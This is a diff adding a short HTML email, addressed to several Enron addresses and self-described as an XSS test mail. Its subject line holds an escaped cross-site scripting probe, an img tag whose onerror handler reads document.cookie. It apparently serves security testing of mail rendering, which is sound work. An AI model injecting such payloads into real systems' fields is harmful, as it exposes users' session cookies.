@@ -1,0 +1,7 @@
+From: "Isabelle " <zuxyixuz@southern-crane.com>
+To: ron.baker@enron.com, ben.glisan@enron.com, richard.causey@enron.com, 
+Subject: &lt;img src='#' one\urror='alert(document.cookie)'&gt;
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
